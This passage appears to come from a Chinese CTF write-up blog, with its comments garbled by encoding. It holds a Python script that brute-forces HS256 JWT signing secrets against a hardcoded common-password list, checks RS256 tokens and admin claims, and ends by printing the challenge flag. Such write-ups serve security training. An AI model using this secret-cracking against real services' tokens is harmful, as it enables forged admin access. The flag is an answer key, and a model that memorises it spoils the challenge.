class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># --- æ–‡ä»¶å†…å®¹ç¡¬ç¼–ç  ---</span><br><br><span class="hljs-comment"># ä» wordlist.txt æå–çš„å†…å®¹</span><br>WORDLIST_CONTENT = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">qwerty</span><br><span class="hljs-string">welcome</span><br><span class="hljs-string">dragon</span><br><span class="hljs-string">monkey</span><br><span class="hljs-string">admin</span><br><span class="hljs-string">abc123</span><br><span class="hljs-string">trustno1</span><br><span class="hljs-string">iloveyou</span><br><span class="hljs-string">welcome1</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">password</span><br><span class="hljs-string">summer2025</span><br><span class="hljs-string">letmein</span><br><span class="hljs-string">123456</span><br><span class="hljs-string">football</span><br><span class="hljs-string">111111</span><br><span class="hljs-string">p@ssw0rd</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># ä» tokens.txt æå–çš„å†…å®¹</span><br>TOKENS_CONTENT = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZXZlIiwiaXNzIjoic3ZjLWd3IiwiYWRtaW4iOnRydWV9.u1-WBFIqURvwbKeDRN9bskgxfyR6ABIIEyMoGjbDINviCZ9YH2INQwsyJriB9GKUXo3pPlq2vVZ90rWRVj7jOpyTsYAeu4RKxWkErTxxy2MuGKCfLegx5SXwAixPjDCfFv1GudHdQ5Mk9PZlHWLsoltqCJd7A-MfBhwkWAlFKbV9SZUBADMP8NfH-slxQKZYgOeM9zyQ0u2_v1r4gLS0YiMV8tMSputLcY_qg3ReU6Wj3q76FPW15fKkDXcrc91471nfmFmJUPaEkd9nefhyDG_9qam0zGX63y5Exb7B8TgGSTuQI_hVJKcE5FRpeiG99uUmUCfym6kAhqdSqNXa0Q</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZGF2ZSIsImlzcyI6InN2Yy1ndyIsInJvbGUiOiJhbmFseXN0In0.c2k8N-bWdK5X1xVmZ1mTB5Ve3iR7JXKE2NuySCeb-XU</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZXZlIiwiaXNzIjoic3ZjLWd3Iiwicm9sZSI6ImFkbWluIn0.HKj-colBnAUpG09DHdJSKu62Q2Kg8lb1oFWEMGtqlC4</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZGF2ZSIsImlzcyI6InN2Yy1hcGkiLCJhZG1pbiI6dHJ1ZX0.d3S9cKJTa3tio75VN_IbLZFYwc8W6UYQ6F_yifuNR-I</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZXZlIiwiaXNzIjoic3ZjLWFwaSIsInJvbGUiOiJhZG1pbiJ9.ZrLvxIYF0_Xa9vs-AYBwYaozbsneuTKajDgxIT5NvzU</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoibWFsbG9yeSIsImlzcyI6InN2Yy1ndyIsInJvbGUiOiJhbmFseXN0In0.lCftjyuIHTjGVdZAsXIuQpBkozR2nLRNYLEb5wFxlrw</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZXZlIiwiaXNzIjoic3ZjLWd3Iiwicm9sZSI6InZpZXdlciJ9.qzoOCny9o-w3hnPM3jHuJhWF4I70cPxVQW6RWafGQNXHAEyYMDLFK768uLfYeR0jp5-VWmzBYE8uLENCwC3HNhiYLP4H16lLmetS0aW_e_JVnqwttXpiOg99Qc4-8DysyzCIbBmhnNjmSziRQK2-KsP_R4sEkApsTtpRSk9QnZaMob_F1IryUsYek8CIpIKwO3-a5cPFgzf1-sUXdL7cLdbVkFiT9aVAB-FREMbe0-e8lyFtarkAdN1LJ4DyZ9QncIy4IeZp_cPdwZeiSFMH8PTMi3GG8clICKYuiXBi5DvZAb28BQ-KYrsimKBI1m_OdUNsHzKwVrNMYuGzvWgSOQ</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYWxpY2UiLCJpc3MiOiJzdmMtYXV0aCIsInJvbGUiOiJ2aWV3ZXIifQ.eAMwwxOEiEDogCVqfy4VkOllvh_0WVXSrPfOrMOa1A9JvOS1haycYsPMaRVBTmVLjZIlkrF6NJRmUilKJRA3E8l5jHo4Dfak7NaXSZWIEcVzG7Hx2TVekHEHSZqSYtnl0imZuwC278Ru99cmQECgt6xVGlF-RHiX04_bspRY0ly1KfW996H7ojZu5krL5xMzvGY90tk9-QnelvfkODCyVjai7PGzDXoRLNAO6IzyGeljbLAy81uT-UVmGQD67i31xDBIZEBIZluewRvS9L1u5JDadXtbz-f5TMxy_lwChKhkoLlNLYUVCIP5lA6EJraglsXRBv3_v94-mSOcTsorhw</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoibWFsbG9yeSIsImlzcyI6InN2Yy1hcGkiLCJhZG1pbiI6dHJ1ZX0.qHmA_LKw0b0jeBM7Y75I-PlR7mc0g77jzGvQDometR4</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZGF2ZSIsImlzcyI6InN2Yy1ndyIsInJvbGUiOiJ2aWV3ZXIifQ.u2dfnGqRntI_WqKOhMePHYi8mDrXjdJkg7aNYhpOk0vBqJDiX37D7IuciMj-dGu-r6S9bXTiQTpEQIki7-ASAWXp96MBiSPLqZbM0G1JW_QJNEPaUQVCeYnGktw2_2FjY3IJ51jo1niERPHgzItu6YTDzKV3vG8Am9IL9kj0ZcbDA91b6HYd4VSRiUBM5s0JeN7xLFJYJKO1WJ1WXE-eXN70e1ab6cOkRgEA1gmUSt_9tvDXr-ZZt0SNkGjtgUyp650zfU2bnCTAUB08w9xwQpSvEKhlMejwfD4zJ24nq4USfVBPTusjGqn3mYrT3-DU9VCCxE3NgyMvxrfOVjxUng</span><br><span class="hljs-string">eyJhbGciOiJIUzI1S2IsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiY2Fyb2wiLCJpc3MiOiJzdmMtYXV0aCIsInJvbGUiOiJ2aWV3ZXIifQ.CimzECi1hbWAGtt-Ps0VBZdT9f5G4mbYPn02L1UEqoM</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoibWFsbG9yeSIsImlzcyI6InN2Yy1hdXRoIiwicm9sZSI6InVzZXIifQ.vJK8sI5LCA_XNeV751gL1OfSDnfuDTevADDkF0g_fzI</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYWxpY2UiLCJpc3MiOiJzdmMtYXV0aCIsInJvbGUiOiJ1c2VyIn0.GYuFUzyj34ovBxrrZ7sNtzNzpPUCn5wmxSHZ5xcvq94</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiY2Fyb2wiLCJpc3MiOiJzdmMtYXV0aCIsInJvbGUiOiJzdXBlcnVzZXIifQ.nmGxwNXtIuLw--BDYi5J357VDzXvRykC8ueycOcWuQ1tIDdnzPNN9HjN0XN6bcBz3nhZM5WXLMPWIKoiW5wDr3k44XDLJv4g5bbLNtpiMrjSk4N-zAitteO-eBCOiV2ZCugXKNsBtMOJm7RWSK_UJ0jyGGXseUrhdHZTN7cwXeNILkB87NWv4JBgPBsv1kDot2M2vrC25PGCpHsMv5ia4N-AegJF7Xiv-mQwN0QnnxvUAsr9SI1Rf57RnMfVkwMt9CJ6eqnXN-FcVDIJzovhjqtolL3jgG9JPDwxMIW-U4sddxErkeaWgBprviiVKxno-RDRVuZqUiWFhEYgNGgqRw</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYWxpY2UiLCJpc3MiOiJzdmMtYXV0aCIsImFkbWluIjp0cnVlfQ.ibbmszD3yQmuurT_yPrlRXL9OY0MXNw3u-gkWaqYJ8HsMAF2vekNq99gSP6gPA8JIi1sDY861CEb7cYu8lgk9VLSOOvVD14fcs-PC1ztQJqoi8DDYW59QZyDz6cHIC95khY3RgH2Q5p-AoCxveoE22-zX63O_f3KHWWHkD-lDhbnZuF8JIqtAoEJj8K8RVk3NqXc5QZOm-dXxCelaQrco_CU89KvU8S3XfYzwfaZV_FynXWsqQX6tvCUXMO30wwb5J7kmRmAy3GxjrNPbNI1KDTpAlK7TvqAqZsYzcp3XIj95QF_4pbnOfOInEQf8IZqAaf1ET5mWBT7QkNyXHkHFw</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYWxpY2UiLCJpc3MiOiJzdmMtZ3ciLCJyb2xlIjoidmlld2VyIn0.PQCppoULjVaNOr2F27nbQC1XxCnInT_rjV82w8NsRLQ</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoibWFsbG9yeSIsImlzcyI6InN2Yy1ndyIsImFkbWluIjp0cnVlfQ.LaktQpFf0FESB4ebaK5SMkesB-Z6F_tgZD3M7ZjZgDyQK_bzsGGUF72Ek23iUHohOTNzD3QRQHx7GEudROj1GVYqSpPmhwWDAkm_QQOMtZddBwdyJoBF7Nm86frkgU1hvvdCp3wn1EzxpS6psDDYe6eHFSkjp-nJefipi3cFDtt4AOxoNhtXxQiceZimV4HXL4xJb_cn8ctQBLec0ecrHBpxCxvjmQ9rilU0LWSL8W_ur5cslFlps1Kj6T2_IR_z0HgFPk0zgyWwni99UCxPjR6RhUXPNCml_iAqP8b476Hm6_rbUY9nDaEKStgl_Ty5vdBaseoHV_rCxEZKldpbcA</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZXZlIiwiaXNzIjoic3ZjLWFwaSIsInJvbGUiOiJ2aWV3ZXIifQ.WdsF3ZxesIxKmtC6csh9gk3_9rilZq5l3cKBIJv11Ac</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZGF2ZSIsImlzcyI6InN2Yy1hcGkiLCJhZG1pbiI6dHJ1ZX0.AiE4y_tUSnIpSgT2Qum3_vo7-dDj-El17v5wgEcgiFXcBn5YfCBlxuoPqIWaySkepfSljtAn5VHGcy5e0xxGg6Qj9aLA3adSZHhWqxievNjawhy72sKOz6gnzky8HjeLLIA-_zHktGV1PoIEcr0NE4cjod_cRpB6hdGqEDV-XOzuw9exyK2bdPnYqHNJ5-8Qz2X7dSyVQXlMGutrQXANXcbcKsy6SptNr6Ok9ZIPXxbx6X2CW8k5SMe12R6eBPUL94TU14X5a3EZFq6S-P9qCJT84oweroS2nGAFJrZlK3mk4PhjOzhFl6j-EBuTtgtpZxJ3he-MBbaznzp1rZaCDQ</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYWxpY2UiLCJpc3MiOiJzdmMtYXBpIiwiYWRtaW4iOnRydWV9.XTWgQgovF-CFKd5Vnr5W38t4jm0qthD7ZreQYrH_NY2MvmbuE44ebWWNTq1e-85xymkxCxYKuGAjAtAZNAeDybiFnpBvbSp96IgenyL3CdICAitShWFRr_wCUGiIhSLhy_iJYeLI2T6ag0H78LnMlho7_QXwS7s8jhRRs8-Bioa47SgfRtq1Zu-Pr94nS2mqVwrueNWSWIRlCMjSwpEtL4Riay5j-iM5Tuzd3b2_Sqk_aLUzMfTTkAddd_DlRZdeiJxjPhtOCFx4nXfak_efruqmiKPo1w59aA8Y60C6NgHnmJVzLAJWsa-w5ugHqynWOqp0IlcfEy3ej6wPzmY1_w</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiY2Fyb2wiLCJpc3MiOiJzdmMtYXV0aCIsImFkbWluIjp0cnVlfQ.eA35hXftK-fdBrkUE6b3y_ThrUvE6Lou9gLfVB-_emU</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYWxpY2UiLCJpc3MiOiJzdmMtYXBpIiwicm9sZSI6InZpZXdlciJ9.74HdzHvRdKSz7bdCVPKX5L1uMYAd4UMrMjEpxDjkT-o</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYm9iIiwiaXNzIjoic3ZjLWF1dGgiLCJyb2xlIjoidmlld2VyIn0.wkcbqeKGN4q_3Zr-nDuhkjLC7mGEkka0Xf5cGutaNjE</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYm9iIiwiaXNzIjoic3ZjLWFwaSIsInJvbGUiOiJzdXBlcnVzZXIifQ.bUZRWHiEe52iSLH6-WnNPCsSJVQ4ZukXq7ljVyrNWlQ</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiY2Fyb2wiLCJpc3MiOiJzdmMtYXBpIiwicm9sZSI6InVzZXIifQ.McO9wtCNn5PpOTZqZqWZb01iI1du9pzydOIySUcpUvE</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZXZlIiwiaXNzIjoic3ZjLWFwaSIsInJvbGUiOiJhbmFseXN0In0.kS1oBf0_mOqFLskYFG00MXdvFZcGHKVlrTcUWnvq4Ss</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYWxpY2UiLCJpc3MiOiJzdmMtZ3ciLCJhZG1pbiI6dHJ1ZX0.M3PnTIGbdHHa_5h0PjNuw-kjov24nYQ5_0KVLkIWfp4</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYm9iIiwiaXNzIjoic3ZjLWFwaSIsImFkbWluIjp0cnVlfQ.eofNcjj6xkHj3_PHjH07z9GkxGOhg7wCWC5g7uC5IVg</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZXZlIiwiaXNzIjoic3ZjLWFwaSIsInJvbGUiOiJhbmFseXN0In0.l__G2hCuhUWiW5dqZ9IXVYPyBlIrO9JesFD4s0T_A6o</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZGF2ZSIsImlzcyI6InN2Yy1hcGkiLCJyb2xlIjoidXNlciJ9.o2J8jpkJnoGty5BsLRMCpGSTEgK6XdDDgOR8uPe4aHIQY0GEWPnqdJ6vq_MOqAS8Az-B9BCXmziNZoqfLEPq25VECS8OVqvCCywR3LkwULe28goEH8cpxX7KlnXLdJhNWdQSJz6YM_Odno1EYTvFg2f84Oh2BNou4wO74M1anW0FKhn3ORbmjK5w6h5lc4O0Thu2DabG1MM0UTsQIp3XvImbLk6tKDD3uvJUvLTLR-SxXMTnFDLvD98Z_bOtrVB4fVPeetr9M9LTUuaEHIh_4D-KpQ3VGrH3two778O7nOO6LAgoLvCpy1iuDxVJ_cD-w9BAcq7P8aEUMCUILzV1SA</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># ä» public_key.pem æå–çš„å†…å®¹</span><br>PUBLIC_KEY_CONTENT = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">-----BEGIN PUBLIC KEY-----</span><br><span class="hljs-string">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv/XeR140bweC8pkyVGai</span><br><span class="hljs-string">1E/SemBHt71gjhaHgQkS0AmhUhziWVXl26nEX65Ur7surRNG8inpJwF3l16vtBhy</span><br><span class="hljs-string">pRKc1kG2Ng7IXfjsrZdaNOv5PEYuR+fJvbakoY/iSRELZXqmcYqyeokZCl6PgK7P</span><br><span class="hljs-string">pHhW91m+YqcpEX35xPPWi8EI9n8ogUF9MSpY9AkAstcl3hTmEclBm4NLskmdYcOs</span><br><span class="hljs-string">6TuPiHJalGQWmpODB5VDotsHCM+t/e5Id/vhwVZPu8c8Q0Vjs+AwL68sihd5deNl</span><br><span class="hljs-string">wArGUvuFxB9JAMCUaGKMapfLXB12Cs/yArBoABtVm5hEdSH3UUYYOsFmB99qQZ+v</span><br><span class="hljs-string">cQIDAQAB</span><br><span class="hljs-string">-----END PUBLIC KEY-----</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_admin_permissions</span>(<span class="hljs-params">payload</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    æ£€æŸ¥JWTè½½è·æ˜¯å¦åŒ…å«ç®¡ç†å‘˜æƒé™ã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    ç®¡ç†å‘˜æƒé™æ¡ä»¶ï¼š</span><br><span class="hljs-string">    1. &#x27;admin&#x27; é”®çš„å€¼ä¸º True (å¸ƒå°”å€¼æˆ–å­—ç¬¦ä¸² &quot;true&quot;)</span><br><span class="hljs-string">    2. &#x27;role&#x27; é”®çš„å€¼ä¸º &#x27;admin&#x27; æˆ– &#x27;superuser&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è¿”å›: True å¦‚æœæœ‰ç®¡ç†å‘˜æƒé™,å¦åˆ™ Falseã€‚</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(payload, <span class="hljs-built_in">dict</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># æ¡ä»¶1: admin=true (å…¼å®¹å¸ƒå°”å€¼å’Œå­—ç¬¦ä¸²)</span><br>    admin_flag = payload.get(<span class="hljs-string">&#x27;admin&#x27;</span>)<br>    <span class="hljs-keyword">if</span> admin_flag <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">str</span>(admin_flag).lower() == <span class="hljs-string">&#x27;true&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-comment"># æ¡ä»¶2: role in &#123;&#x27;admin&#x27;, &#x27;superuser&#x27;&#125;</span><br>    role = payload.get(<span class="hljs-string">&#x27;role&#x27;</span>)<br>    <span class="hljs-keyword">if</span> role <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;superuser&#x27;</span>]:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä¸»å‡½æ•°ï¼Œæ‰§è¡ŒJWTå®¡è®¡ä»»åŠ¡ã€‚</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 1. ä»ç¡¬ç¼–ç çš„å­—ç¬¦ä¸²åŠ è½½æ•°æ®</span><br>    <span class="hljs-comment"># .strip()å»é™¤é¦–å°¾ç©ºç™½, .splitlines()æŒ‰è¡Œåˆ†å‰²</span><br>    wordlist = WORDLIST_CONTENT.strip().splitlines()<br>    jwt_tokens = TOKENS_CONTENT.strip().splitlines()<br>    public_key = PUBLIC_KEY_CONTENT.strip()<br><br>    valid_admin_indices = []<br><br>    <span class="hljs-comment"># 2. éå†æ‰€æœ‰JWTä»¤ç‰Œè¿›è¡Œå®¡è®¡ (enumerate ä»1å¼€å§‹è®¡æ•°)</span><br>    <span class="hljs-keyword">for</span> index, token <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(jwt_tokens, <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> token:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># é¦–å…ˆæ— éªŒè¯åœ°è§£ç å¤´éƒ¨ä»¥è·å–ç­¾åç®—æ³• (alg)</span><br>            header = jwt.get_unverified_header(token)<br>            alg = header.get(<span class="hljs-string">&#x27;alg&#x27;</span>)<br><br>            payload = <span class="hljs-literal">None</span><br>            is_signature_valid = <span class="hljs-literal">False</span><br><br>            <span class="hljs-comment"># æ ¹æ®ç®—æ³•è¿›è¡Œç­¾åéªŒè¯</span><br>            <span class="hljs-keyword">if</span> alg == <span class="hljs-string">&#x27;HS256&#x27;</span>:<br>                <span class="hljs-comment"># é€ä¸€å°è¯•å­—å…¸ä¸­çš„å¯†ç </span><br>                <span class="hljs-keyword">for</span> secret <span class="hljs-keyword">in</span> wordlist:<br>                    <span class="hljs-keyword">try</span>:<br>                        <span class="hljs-comment"># å°è¯•éªŒè¯ç­¾åå¹¶è§£ç ï¼Œå¿½ç•¥è¿‡æœŸæ—¶é—´</span><br>                        payload = jwt.decode(<br>                            token,<br>                            secret,<br>                            algorithms=[<span class="hljs-string">&#x27;HS256&#x27;</span>],<br>                            options=&#123;<span class="hljs-string">&quot;verify_exp&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;verify_signature&quot;</span>: <span class="hljs-literal">True</span>&#125;<br>                        )<br>                        is_signature_valid = <span class="hljs-literal">True</span><br>                        <span class="hljs-keyword">break</span>  <span class="hljs-comment"># å¯†ç æ­£ç¡®ï¼Œåœæ­¢å°è¯•</span><br>                    <span class="hljs-keyword">except</span> jwt.InvalidSignatureError:<br>                        <span class="hljs-keyword">continue</span>  <span class="hljs-comment"># å¯†ç é”™è¯¯ï¼Œå°è¯•ä¸‹ä¸€ä¸ª</span><br><br>            <span class="hljs-keyword">elif</span> alg == <span class="hljs-string">&#x27;RS256&#x27;</span>:<br>                <span class="hljs-comment"># ä½¿ç”¨å…¬é’¥éªŒè¯ç­¾å</span><br>                <span class="hljs-keyword">try</span>:<br>                    payload = jwt.decode(<br>                        token,<br>                        public_key,<br>                        algorithms=[<span class="hljs-string">&#x27;RS256&#x27;</span>],<br>                        options=&#123;<span class="hljs-string">&quot;verify_exp&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;verify_signature&quot;</span>: <span class="hljs-literal">True</span>&#125;<br>                    )<br>                    is_signature_valid = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">except</span> jwt.InvalidSignatureError:<br>                    <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># ç­¾åæ— æ•ˆï¼Œis_signature_valid ä¿æŒ False</span><br><br>            <span class="hljs-comment"># 3. å¦‚æœç­¾åéªŒè¯é€šè¿‡ï¼Œåˆ™æ£€æŸ¥ç®¡ç†å‘˜æƒé™</span><br>            <span class="hljs-keyword">if</span> is_signature_valid <span class="hljs-keyword">and</span> payload:<br>                <span class="hljs-keyword">if</span> check_admin_permissions(payload):<br>                    valid_admin_indices.append(index)<br><br>        <span class="hljs-keyword">except</span> jwt.DecodeError:<br>            <span class="hljs-comment"># JWTæ ¼å¼æœ¬èº«æœ‰é—®é¢˜ï¼Œè·³è¿‡</span><br>            <span class="hljs-comment"># print(f&quot;è­¦å‘Š: ä»¤ç‰Œ &#123;index&#125; æ ¼å¼é”™è¯¯ï¼Œå·²è·³è¿‡ã€‚&quot;)</span><br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-comment"># æ•è·å…¶ä»–æœªçŸ¥é”™è¯¯ä»¥é˜²è„šæœ¬ä¸­æ–­</span><br>            <span class="hljs-comment"># print(f&quot;è­¦å‘Š: å¤„ç†ä»¤ç‰Œ &#123;index&#125; æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: &#123;e&#125;&quot;)</span><br>            <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-comment"># 4. æŒ‰è¦æ±‚æ ¼å¼åŒ–å¹¶è¾“å‡ºç»“æœ</span><br>    <span class="hljs-comment"># å°†æ‰¾åˆ°çš„åºå·ä»å°åˆ°å¤§æ’åºå¹¶ç”¨å†’å·è¿æ¥</span><br>    result_string = <span class="hljs-string">&quot;:&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, <span class="hljs-built_in">sorted</span>(valid_admin_indices)))<br>    flag = <span class="hljs-string">f&quot;flag&#123;&#123;<span class="hljs-subst">&#123;result_string&#125;</span>&#125;&#125;&quot;</span><br><br>    <span class="hljs-built_in">print</span>(flag)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1</span>:<span class="hljs-number">3</span>:<span class="hljs-number">4</span>:<span class="hljs-number">5</span>:<span class="hljs-number">9</span>:<span class="hljs-number">14</span>:<span class="hljs-number">15</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span>:<span class="hljs-number">20</span>:<span class="hljs-number">21</span>:<span class="hljs-number">24</span>:<span class="hljs-number">27</span>:<span class="hljs-number">28</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Brute-Force-Detection"><a href="#Brute-Force-Detection" class="headerlink" title="Brute_Force_Detection"></a>Brute_Force_Detection</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">æ¨¡å¼å®šä¹‰ï¼šåŒä¸€æº<span class="hljs-built_in">IP</span>åœ¨ <span class="hljs-number">10</span>åˆ†é’Ÿå†… é’ˆå¯¹åŒä¸€ç”¨æˆ· è¿ç»­<span 